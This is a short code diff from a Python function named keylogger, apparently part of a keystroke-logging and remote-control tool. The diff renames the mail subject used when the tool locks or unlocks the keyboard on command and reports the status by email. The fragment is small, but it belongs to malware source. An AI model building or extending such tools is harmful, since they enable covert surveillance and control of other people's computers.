@@ -65,11 +65,11 @@ def keylogger():
             if islock == 0:
                 islock = 1
                 lock_keyboard(islock)
-                g.send_mail("key_hook", "lockkeyboard")
+                g.send_mail("key_lock", "lockkeyboard")
             else:
                 islock = 0
                 lock_keyboard(islock)
-                g.send_mail("key_hook", "unlockkeyboard")
+                g.send_mail("key_lock", "unlockkeyboard")
         elif msg == "QUIT":
             listener.stop()
             return
